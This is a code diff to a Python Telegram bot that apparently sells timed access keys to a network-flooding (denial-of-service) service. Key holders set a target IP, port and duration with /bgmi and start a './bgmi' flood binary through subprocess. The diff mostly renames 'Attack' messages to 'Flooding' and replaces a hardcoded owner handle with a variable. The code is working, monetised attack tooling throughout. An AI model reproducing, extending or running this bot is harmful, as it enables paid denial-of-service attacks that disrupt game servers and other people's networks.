@@ -89,7 +89,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @raj_9479"
+        response = "ONLY OWNER CAN USE💀OWNER @{OWNER_USERNAME}..."
 
     await update.message.reply_text(response)
 
@@ -110,11 +110,11 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"✅Key redeemed successfully! Access granted until if problem occurs contact admins: {users[user_id]} OWNER- @raj_9479..."
+            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @{OWNER_USERNAME}..."
         else:
-            response = "Invalid or expired key buy from @raj_9479."
+            response = "Invalid or expired key buy from @{OWNER_USERNAME}."
     else:
-        response = "Usage key: /redeem <key>"
+        response = "Usage: /redeem <key>"
 
     await update.message.reply_text(response)
 
@@ -147,7 +147,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> then give /start to start attack by @raj_9479')
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
         return
 
     target_ip = context.args[0]
@@ -155,7 +155,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'Attack parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @{OWNER_USRERNAME}...')
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @{OWNER_USRERNAME}...')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -163,19 +163,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.Buy key from- @raj_9479...")
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @{OWNER_USRERNAME}...")
         return
 
     if flooding_process is not None:
-        await update.message.reply_text('Attack is already running.')
+        await update.message.reply_text('Flooding is already running.')
         return
 
     if flooding_command is None:
-        await update.message.reply_text('No Attack parameters set. Use /bgmi to set parameters.')
+        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('ATTACK STARTED WITH 677MS💪')
+    await update.message.reply_text('Started flooding.')
 
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -187,12 +187,12 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_process is None:
-        await update.message.reply_text('NO ATTACK FOUND 😁')
+        await update.message.reply_text('No flooding process is running.OWNER @{OWNER_USRERNAME}...')
         return
 
     flooding_process.terminate()
     flooding_process = None
-    await update.message.reply_text('ATTACK STOPPED NOW IS NORMAL MATCH 😂')
+    await update.message.reply_text('Stopped flooding.')
 
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -217,14 +217,14 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     response = (
-        "Welcome to the Attack Bot by @raj_9479 ..! Here are the available commands:\n\n"
+        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
         "Admin Commands:\n"
         "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
         "/allusers - Show all authorized users.\n"
         "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
         "User Commands:\n"
         "/redeem <key> - Redeem a key to gain access.\n"
-        "/bgmi <target_ip> <port> <duration> - Set the Attack parameters.\n"
+        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
         "/start - Start the flooding process.\n"
         "/stop - Stop the flooding process.\n"
     )
